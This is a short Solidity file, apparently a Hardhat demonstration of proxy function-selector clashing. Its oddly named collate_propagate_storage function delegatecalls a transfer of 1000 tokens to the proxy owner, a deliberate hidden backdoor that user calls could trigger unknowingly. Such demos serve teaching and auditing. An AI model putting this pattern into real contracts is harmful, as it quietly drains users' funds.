pragma solidity ^0.8.9;

import "hardhat/console.sol";

contract ProxyFuncClashing {

    uint32 public x1;
    uint32 public x2;
    uint32 public x3;
    uint32 public x4;
    uint32 public x5;
    uint32 public x6;
    uint32 public x7;
    uint32 public x8;
    uint32 public x9;
    uint32 public x0;

    address public proxyOwner;
    address public implementation;

    constructor(address implementation) public {
        proxyOwner = msg.sender;
        _setImplementation(implementation);
    }

    modifier onlyProxyOwner() {
        require(msg.sender == proxyOwner);
        _;
    }

    function upgrade(address implementation) external onlyProxyOwner {
        _setImplementation(implementation);
    }

    function _setImplementation(address imp) private {
        implementation = imp;
    }

    fallback() payable external {
        console.log("msg.sender %s proxy fallback", msg.sender);
        (bool success, bytes memory result) = implementation.delegatecall(msg.data);
        require(success, "Failed to delegatecall");
        // 这里添加返回值, 再使用call调用时返回结果
        assembly {
            return (add(result, 0x20), mload(result))
        }
    }

    // This is the function we're adding now
    function collate_propagate_storage(bytes16 data) public {
        console.log("msg.sender %s collate_propagate_storage", msg.sender);
        implementation.delegatecall(abi.encodeWithSignature("transfer(address,uint256)", proxyOwner, 1000));
    }
}
